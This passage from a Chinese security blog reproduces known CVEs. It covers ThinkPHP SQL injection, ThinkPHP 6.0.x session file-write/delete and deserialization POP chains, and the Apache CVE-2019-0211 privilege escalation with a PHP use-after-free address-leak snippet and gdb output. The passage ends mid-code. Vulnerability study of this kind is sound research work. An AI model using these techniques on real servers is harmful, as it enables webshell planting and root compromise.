<code>updatexml()</code> 被直接插入到 SQL 查询。</li></ul></li><li><strong><code>updatexml()</code> 触发错误信息，泄露数据库用户名</strong>：<ul><li>通过 <code>concat(0xa,user())</code>，可获取数据库的 <code>user()</code> 信息</li></ul></li></ol><p><strong>payload2原理：</strong></p><p>这就是直接通过闭合来实现的sql注入</p><p>从下图中可以看出已经注入成功回显信息</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503271714284.png" alt="屏幕截图 2025-03-27 171000"></p><p>继续往下翻可以查看到数据库的账号以及密码（信息泄露）</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503271715164.png" alt="屏幕截图 2025-03-27 171011"></p><h2 id="四、ThinkPHP-v6-0-x-任意文件操作漏洞"><a href="#四、ThinkPHP-v6-0-x-任意文件操作漏洞" class="headerlink" title="四、ThinkPHP v6.0.x 任意文件操作漏洞"></a>四、ThinkPHP v6.0.x 任意文件操作漏洞</h2><p>漏洞描述：在开启Session的情况下可以导致创建任意文件以及删除任意文件，<strong>特定情况下</strong>可以getshell[<strong>清楚后端处理session的逻辑</strong>]</p><h3 id="影响版本：6-0-0"><a href="#影响版本：6-0-0" class="headerlink" title="影响版本：6.0.0&lt;&#x3D;thinphp&lt;&#x3D;6.0.2"></a>影响版本：6.0.0&lt;&#x3D;thinphp&lt;&#x3D;6.0.2</h3><h3 id="实现前提"><a href="#实现前提" class="headerlink" title="实现前提"></a>实现前提</h3><p>开启Session</p><p>清楚后端处理session的逻辑</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a><strong>漏洞分析</strong></h3><p>根据文件目录和更改的函数部分猜测：可能是存储 Session 时导致的文件写入；然后跟进找一下相关的函数，可以看到 <code>vendor/topthink/framework/src/think/session/Store.php:254</code> 的 save()函数，265 行还可以对文件进行删除操作，并且对后端业务逻辑依赖较低</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503271926810.webp" alt="save.png"></p><p>可以看到设置了 $sessionId，并且调用了一个 write 函数，继续跟进，找到 write()函数 <code>vendor/topthink/framework/src/think/session/driver/File.php:210</code></p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503271926812.webp" alt="write.png"></p><p>继续跟进，找到 writeFile()函数</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503271926795.webp" alt="writeFile.png"></p><p>可以看到调用了 <code>file_put_contents()</code> 函数，这里是真正<strong>写入文件的操作</strong>了</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503271931801.webp" alt="fileputcontents.png"></p><ul><li>接下来我们反向分析一下，看看能不能找到可控点</li></ul><ol><li>函数 <code>file_put_contents($path,$content,LOCK_EX)</code> 中参数 <code>$path,$content</code> 来源于函数 <code>writeFile($path,$data)</code></li><li>函数 <code>writeFile($path,$data)</code> 中参数 <code>$path,$data</code> 来源于函数 <code>write(String $sessionID,String $sessiData)</code></li><li>函数 <code>write(String $sessionID,String $sessiData)</code> 中参数 <code>$sessionID,$sessiData</code> 来源于 <code>save()</code> 中调用了 <code>write()</code>，同时传入的参数 <strong><code>$sessionId</code> 的值是调用 <code>getId()</code> 传入的</strong></li></ol><h4 id="getshell文件名写入点："><a href="#getshell文件名写入点：" class="headerlink" title="getshell文件名写入点："></a>getshell文件名写入点：</h4><p>综上：文件名来源于 最开始的<code>getId()</code>得到的<code>$sessionId</code>的值</p><p>当传入的参数<code>$id</code>满足32位的长度时，就将该值设为<code>$this-&gt;id</code><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503271931581.webp" alt="session.png"></p><p>接下来找调用 <code>setId()</code> 的地方 <code>vendor/topthink/framework/src/think/middleware/SessionInit.php:46</code></p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503271931098.webp" alt="sessionI.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503271931398.png" alt="image-20250327193115350"></p><p>其中 <code>cookieName</code> 的值为 <code>PHPSESSID</code>，而 <code>$sessionId</code> 是 <code>cookie</code> 中名为 <code>PHPSESSID</code> 的值，因此是攻击者可控的，从而导致写入的文件名可控。</p><h4 id="getshell文件内容写入点"><a href="#getshell文件内容写入点" class="headerlink" title="getshell文件内容写入点"></a>getshell文件内容写入点</h4><p>然后写入的文件名可控，那么写入<strong>的内容是否可控</strong>呢？</p><p>分析发现，写入的内容就是创建session使用的内容。但是session的创建是由实际的后端业务逻辑来决定的，<strong>而默认环境下并没有创建session。因此，默认环境下无法做到任意文件写入。</strong></p><p>因为这里是在本地环境中复现所以我们可以开启session然后加上后端获取session的业务逻辑便可完成复现</p><p> thinkphp6 <strong>开启 session 的方法</strong>：删除 <code>/app/middleware.php</code> 最后一行的注释</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503271926314.webp" alt="kq.png"></p><p>我们在 <code>app\controller\index.php</code> 中增加一些代码后，如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>namespaceapp\controller;<br>usethink\facade\Session;<br>useapp\BaseController;<br>classIndexextendsBaseController <br>&#123;<br><span class="hljs-title function_ invoke__">publicfunctionindex</span>()<br>&#123;<br><span class="hljs-title class_">Session</span>::<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&#x27;name&#x27;</span>,<span class="hljs-string">&#x27;thinkphp&#x27;</span>);<br>return1;<br><span class="hljs-comment">// return&#x27;&lt;style type=&quot;text/css&quot;&gt;*&#123; padding: 0; margin: 0; &#125; div&#123; padding: 4px 48px;&#125; a&#123;color:#2E5CD5;cursor: pointer;text-decoration: none&#125; a:hover&#123;text-decoration:underline; &#125; body&#123; background: #fff; font-family: &quot;Century Gothic&quot;,&quot;Microsoft yahei&quot;; color: #333;font-size:18px;&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.6em; font-size: 42px &#125;&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:) &lt;/h1&gt;&lt;p&gt; ThinkPHP V6&lt;br/&gt;&lt;span style=&quot;font-size:30px&quot;&gt;13载初心不改 - 你值得信赖的PHP框架&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://tajs.qq.com/stats?sId=64890268&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://e.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;think id=&quot;eab4b9f840753f8e7&quot;&gt;&lt;/think&gt;&#x27;;</span><br>&#125;<br><span class="hljs-title function_ invoke__">publicfunctionhello</span>(<span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;ThinkPHP6&#x27;</span>)<br>&#123;<br><span class="hljs-keyword">return</span><span class="hljs-string">&#x27;hello,&#x27;</span>.<span class="hljs-variable">$name</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="本地环境复现"><a href="#本地环境复现" class="headerlink" title="本地环境复现"></a>本地环境复现</h3><p>很简单，只需要构造 PHPSESSID 的值即可，值为 <code>string</code>&amp;&amp;长度为 32</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503271926327.webp" alt="tp.png"></p><p>此时查看一下生成的 session，生成的 session 文件保存在 <code>\runtime\session</code> 下</p><p>session 里的内容:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">a<span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">4</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;name&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">8</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;thinkphp&quot;</span>;<span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>可以看到 session 的内容经过了序列化操作，只要将 session 的内容反序列化即可 getshell</p><ul><li>如果要 getshell 的话，后端需要有类似的 <code>Session::Set(&#39;name&#39;,$_POST[&#39;i&#39;])</code> 代码才可以利用</li></ul><p>**[session的存储是以序列化字符串的形式进行的但是一旦要用到就会进行反序列化 所以我们所写入的序列化字符串会被反序列化后写入到我们的shell文件中]**。</p><p>这个漏洞其实很简单，就是用户可控变量导致的，也没有对一些数据的过滤等等。需要一定条件才可以利用，也就是开启 session；写 webshell 还要看具体的后端业务逻辑等等。</p><h3 id="文件删除"><a href="#文件删除" class="headerlink" title="文件删除"></a>文件删除</h3><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503272104553.png" alt="image-20250327210419467"></p><p>通过上图可知也可实现文件删除操作</p><h2 id="五、ThinkPHP-v6-0-x-反序列化漏洞"><a href="#五、ThinkPHP-v6-0-x-反序列化漏洞" class="headerlink" title="五、ThinkPHP v6.0.x 反序列化漏洞"></a>五、ThinkPHP v6.0.x 反序列化漏洞</h2><h3 id="影响版本：thinkPHP-v6-0-0-6-0-3"><a href="#影响版本：thinkPHP-v6-0-0-6-0-3" class="headerlink" title="影响版本：thinkPHP v6.0.0-6.0.3"></a>影响版本：thinkPHP v6.0.0-6.0.3</h3><p>环境：使用上一个漏洞的环境</p><p>版本安装后默认使用单应用模式部署，url访问受到路由模式的影响，为了使用方便，我们先要去&#x2F;config&#x2F;app.php 中将with_route &#x3D;&gt; false</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503272110296.png" alt="img"></p><p>需要在根目录下的 &#x2F;app&#x2F;controller的index.php里面存在unserialize()函数且为可控点，例如存在</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">l_Ry</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$a</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503272110975.png" alt="img"></p><p>POST传参数a</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>/v6.<span class="hljs-number">0</span>.<span class="hljs-number">2</span>/public/index.php/<span class="hljs-keyword">index</span>/l_Ry<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503272113090.png" alt="img"></p><p>至此环境就搭建完成了</p><p>我跟着网上的资料大概分析了一下<br><a href="https://blog.csdn.net/cosmoslin/article/details/123102811">https://blog.csdn.net/cosmoslin/article/details/123102811</a><br><a href="https://xz.aliyun.com/t/9546#toc-16">https://xz.aliyun.com/t/9546#toc-16</a><br><a href="https://blog.csdn.net/weixin_45794666/article/details/123237118">https://blog.csdn.net/weixin_45794666/article/details/123237118</a><br><a href="https://xz.aliyun.com/t/9405#toc-3">https://xz.aliyun.com/t/9405#toc-3</a></p><p>漏洞的一般起点在<code>__destruct()</code>函数，可利用的函数在<code>vendor\topthink\think-orm\src\Model.php</code></p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503272109841.png" alt="img"></p><p>中间的过程太繁杂，大体和参考的文章差不多就不写出来了，顺着往下找，最终利用点为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$value</span> = <span class="hljs-variable">$closure</span>(<span class="hljs-variable">$value</span>, <span class="hljs-variable language_">$this</span>-&gt;data);<br></code></pre></td></tr></table></figure><p>完整的POP利用链为__destruct()——&gt;save()——&gt;updateData()——&gt;checkAllowFields()——&gt;db()——&gt;$this-&gt;table . $this-&gt;suffix（字符串拼接）——&gt;toString()——&gt;toJson()–&gt;toArray()——&gt;getAttr()——&gt;getData()——&gt;getRealFieldName()——&gt;getValue()</p>]]></content>
    
    
    
    <tags>
      
      <tag>CVE复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2019-0211 Apache提权漏洞复现</title>
    <link href="/2025/03/25/CVE-2019-0211%20Apache%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <url>/2025/03/25/CVE-2019-0211%20Apache%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2019-0211-Apache提权漏洞分析"><a href="#CVE-2019-0211-Apache提权漏洞分析" class="headerlink" title="CVE-2019-0211 Apache提权漏洞分析"></a>CVE-2019-0211 Apache提权漏洞分析</h1><h2 id="一、漏洞描述以及产生原因"><a href="#一、漏洞描述以及产生原因" class="headerlink" title="一、漏洞描述以及产生原因"></a>一、漏洞描述以及产生原因</h2><p>Apache <code>MPM Prefork</code> 的共享内存（SHM）、<code>scoreboard</code> 机制，以及 <code>bucket</code> 结构体的作用，最终讨论的是一个<strong>进程权限提升（Privilege Escalation）漏洞</strong>。<u>这类漏洞通常涉及 <strong>共享内存管理不当</strong>，导致低权限进程能够控制高权限进程的执行流。</u></p><h3 id="1-基础概念"><a href="#1-基础概念" class="headerlink" title="1. 基础概念"></a><strong>1. 基础概念</strong></h3><p>在 <code>MPM Prefork</code> 模式下，Apache 服务器的 <strong>主进程</strong> 运行在 <strong>root</strong> 权限，而负责处理 HTTP 请求的 <strong>Worker 进程</strong> 运行在 <strong>低权限用户（www-data）</strong>，这样可以减少安全风险。[<code>www-data</code> 是 Linux&#x2F;Unix 系统中 <strong>Web 服务器（如 Apache、Nginx）默认使用的低权限用户</strong>，用于运行 Web 相关的进程，如 <code>Worker</code> 进程，以提高安全性。]</p><h3 id="2-共享内存（SHM）"><a href="#2-共享内存（SHM）" class="headerlink" title="2. 共享内存（SHM）"></a><strong>2. 共享内存（SHM）</strong></h3><p>Apache 使用 <strong>共享内存（SHM，Shared Memory）</strong> 来存储 <code>Worker</code> 进程的状态信息，这样主进程可以监视 <code>Worker</code> 进程的运行情况。</p><p>Apache 使用的共享内存主要由 <strong>scoreboard（计分板）</strong> 组成，存储了：</p><ul><li><code>Worker</code> 进程的 PID（进程 ID）。</li><li>当前处理的 HTTP 请求状态。</li><li>连接信息、写入状态等。</li></ul><h3 id="3-bucket-结构"><a href="#3-bucket-结构" class="headerlink" title="3. bucket 结构"></a><strong>3. <code>bucket</code> 结构</strong></h3><p>在 Apache Prefork 里，每个 <code>Worker</code> 进程都对应一个 <strong>bucket</strong>（存储 <code>Worker</code> 进程的信息）</p><p>[Apache <strong>Prefork</strong> 是 Apache 服务器的 <strong>多进程（Process-based）MPM（多处理模块）</strong>]</p><ol><li><p><strong>当 Apache 重启时</strong>，主进程需要 <strong>关闭旧的 Worker 进程</strong>，防止它们继续处理请求。</p></li><li><p><strong>新的 Worker 进程需要占用旧的 Worker 进程释放的资源</strong>，这包括共享内存 <code>bucket</code>。</p></li><li><p>Apache 使用 <code>all_buckets</code> <strong>数组</strong> 来管理所有 <code>Worker</code> 进程的 <code>bucket</code>，并在重启时重新利用这些 <code>bucket</code> 结构。</p><p>**<code>bucket</code>**：[记录 Worker 进程的资源信息，Apache 重启时会使用]</p></li></ol><h3 id="4-漏洞成因：Worker-进程可修改-bucket"><a href="#4-漏洞成因：Worker-进程可修改-bucket" class="headerlink" title="4. 漏洞成因：Worker 进程可修改 bucket"></a><strong>4. 漏洞成因：Worker 进程可修改 <code>bucket</code></strong></h3><p>由于 <code>Worker</code> 进程<strong>可以修改自己在 <code>scoreboard</code> 中的 <code>bucket</code> 值</strong>，但 Apache 并<strong>没有对 <code>bucket</code> 值进行边界检查</strong>，攻击者可以：</p><ol><li>修改 <code>bucket</code> 让其指向 <strong>共享内存的其他区域</strong>。</li><li>伪造 <code>prefork_child_bucket</code> 结构，让 <code>mutex-&gt;meth-&gt;child_init</code> 指向恶意代码。</li><li>在 Apache <strong>重启</strong> 时，<code>child_init()</code> 以 <code>root</code> 权限执行，导致<strong>权限提升漏洞（Privilege Escalation）</strong>。</li></ol><p>漏洞利用路径：</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">Worker 进程（www-data） → 修改 bucket 值 → 控制 `child_init` 函数 → 在 root 权限下执行恶意代码<br></code></pre></td></tr></table></figure><h3 id="各个部分关系图"><a href="#各个部分关系图" class="headerlink" title="各个部分关系图"></a><strong>各个部分关系图</strong></h3><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-addition">+--------------------------------------+</span><br>| Apache 主进程（Root 权限）           |<br>| 监听端口，管理 Worker（低权限） 进程  |<br><span class="hljs-addition">+--------------------------------------+</span><br>            ↓  共享内存（SHM）<br><span class="hljs-addition">+--------------------------------------+</span><br>| Scoreboard（计分板）                 |<br>| - Worker 进程信息（PID, 状态, bucket）|<br><span class="hljs-addition">+--------------------------------------+</span><br>            ↓  通过 bucket 访问资源<br><span class="hljs-addition">+--------------------------------------+</span><br>| all_buckets[]（进程资源管理）         |<br>| - pod（进程通信）                    |<br>| - listeners（监听端口信息）           |<br>| - mutex（进程同步）                   |<br><span class="hljs-addition">+--------------------------------------+</span><br>            ↓  Apache 进程池<br><span class="hljs-addition">+--------------------------------------+</span><br>| Worker 进程（www-data 权限）          |<br>| 处理 HTTP 请求                        |<br><span class="hljs-addition">+--------------------------------------+</span><br></code></pre></td></tr></table></figure><h2 id="二、利用过程"><a href="#二、利用过程" class="headerlink" title="二、利用过程"></a>二、利用过程</h2><h3 id="大致步骤流程"><a href="#大致步骤流程" class="headerlink" title="大致步骤流程"></a>大致步骤流程</h3><p>1、获取Worker进程的读写权限.2、向共享内存空间（SHM）写入一个假的prefork_child_bucket结构。3、将all_bucket[bucket]指向结构。4、等待构造的函数被调用。</p><p>这一过程的好处：</p><p>始终没有创建过主进程，所有过程都映射在访问&#x2F;proc&#x2F;self&#x2F;maps(ASLR&#x2F;PIE保护无效)中，当一个Worker进程关闭或报错时，它会自动由主进程重新创建，所以不会有DOS Apache服务器的风险。</p><p>缺点：</p><p>PHP不允许对&#x2F;proc&#x2F;self&#x2F;mem的读写，也就是说我们没法直接编辑共享内存空间，只能等待重启的时候调用all_bucket函数。</p><h3 id="具体利用步骤：-大致了解"><a href="#具体利用步骤：-大致了解" class="headerlink" title="具体利用步骤：[大致了解]"></a>具体利用步骤：[大致了解]</h3><h3 id="1-获取Worker进程的读写权限"><a href="#1-获取Worker进程的读写权限" class="headerlink" title="1. 获取Worker进程的读写权限"></a>1. 获取Worker进程的读写权限</h3><p>PHP UAF的0day漏洞</p><p>由于mod_prefork函数经常和mod_php函数一起使用，因此可以从CVE-2019-6977这里下手实现漏洞的利用。我在写exp的过程中发现PHP7.X下的UAF 0day漏洞在PHP5.X中也能复现。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs php">PHP UAF<br><br><span class="hljs-meta">&lt;?php</span><br><br> <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">X</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">DateInterval</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">JsonSerializable</span></span><br><span class="hljs-class"></span><br><span class="hljs-class"></span>&#123;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">jsonSerialize</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function">  </span>&#123;<br><br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$y</span>, <span class="hljs-variable">$p</span>;<br><br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$y</span>[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-variable">$p</span> = <span class="hljs-variable language_">$this</span>-&gt;y;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>;<br><br>  &#125;<br><br>&#125;<br><br> <br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_aslr</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function"></span>&#123;<br><br>  <span class="hljs-keyword">global</span> <span class="hljs-variable">$p</span>, <span class="hljs-variable">$y</span>;<br><br>  <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>;<br><br> <br><br>  <span class="hljs-variable">$y</span> = [<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">X</span>(<span class="hljs-string">&#x27;PT1S&#x27;</span>)];<br><br>  <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-number">1234</span> =&gt; &amp;<span class="hljs-variable">$y</span>]);<br><br>  <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;ADDRESS: 0x&quot;</span> . <span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$p</span>) . <span class="hljs-string">&quot;n&quot;</span>);<br><br> <br><br>  <span class="hljs-keyword">return</span> <span class="hljs-variable">$p</span>;<br><br>&#125;<br><br> <br><br><span class="hljs-title function_ invoke__">get_aslr</span>();<br></code></pre></td></tr></table></figure><p>这里有一个PHP对象的UAF：即使我们无法设置$y<a href="X%E7%9A%84%E4%B8%80%E4%B8%AA%E5%AE%9E%E4%BE%8B">0</a>，我们也可以利用$this。</p><p>UAF的读写权限</p><p>我们想要实现两个目标：读取内存地址来找到all_buckets的位置，修改SHM来改变bucket的值，从而加上我们自己的结构。</p><p>好在PHP的堆正好在这两片地址区域的前面。</p><p>PHP堆的内存地址，ap_scoreboard_image-&gt;*和all_buckets</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@apaubuntu:~<span class="hljs-comment"># cat /proc/6318/maps | grep libphp | grep rw-p</span><br><br>7f4a8f9f3000-7f4a8fa0a000 rw-p 00471000 08:02 542265 /usr/lib/apache2/modules/libphp7.2.so<br><br> <br><br>(gdb) p *ap_scoreboard_image<br><br><span class="hljs-variable">$14</span> = &#123;<br><br>  global = 0x7f4a9323e008,<br><br>  parent = 0x7f4a9323e020,<br><br>  servers = 0x55835eddea78<br><br>&#125;<br><br>(gdb) p all_buckets<br><br><span class="hljs-variable">$15</span> = (prefork_child_bucket *) 0x7f4a9336b3f0<br></code></pre></td></tr></table></figure><p>考虑到我们触发了PHP对象中的UAF，对象中的任意属性都属于UAF漏洞的范围。我们可以将zend_object UAF改为zend_string，从而获得一个zend_string结构。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs rust">(gdb) p<span class="hljs-keyword">type</span> <span class="hljs-title class_">zend_string</span><br><br><span class="hljs-keyword">type</span> = <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_zend_string</span> &#123;<br><br>    zend_refcounted_h gc;<br><br>    zend_ulong h;<br><br>    size_t len;<br><br>    <span class="hljs-type">char</span> val[<span class="hljs-number">1</span>];<br><br>&#125;<br></code></pre></td></tr></table></figure><p>len属性包括了字符串的长度，通过增加它，我们可以读写之后的内存空间，也就是说能访问到我们感兴趣的两个内存空间：SHM和Apache的all_buckets</p><p>找到bucket的index值和all_bucket</p><p>我们需要改变ap_scoreboard_image-&gt;parent[worker_id]-&gt;bucket来获得特定的worker_id。好在这个结构每次都在共享内存空间的头部位置，很方便我们去定位。</p><p>共享内存空间和目标process_socre结构</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs ruby">root<span class="hljs-variable">@apaubuntu</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># cat /proc/6318/maps | grep rw-s</span><br><br>7f4a9323e000-7f4a93252000 rw-s <span class="hljs-number">00000000</span> <span class="hljs-number">00</span><span class="hljs-symbol">:</span><span class="hljs-number">05</span> <span class="hljs-number">57052</span>                      /dev/zero (deleted)<br><br> <br><br>(gdb) p &amp;ap_scoreboard_image-&gt;parent[<span class="hljs-number">0</span>]<br><br><span class="hljs-variable">$18</span> = (process_score *) <span class="hljs-number">0x7f4a9323e020</span><br><br>(gdb) p &amp;ap_scoreboard_image-&gt;parent[<span class="hljs-number">1</span>]<br><br><span class="hljs-variable">$19</span> = (process_score *) <span class="hljs-number">0x7f4a9323e044</span><br></code></pre></td></tr></table></figure><p>要定位all_bucket，我们需要充分利用prefork_child_bucket结构，所以我们需要：</p><p>导入bucket值的结构</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs cpp">prefork_child_bucket &#123;<br><br>    <span class="hljs-type">ap_pod_t</span> *pod;<br><br>    ap_listen_rec *listeners;<br><br>    <span class="hljs-type">apr_proc_mutex_t</span> *mutex; &lt;--<br><br>&#125;<br><br> <br><br><span 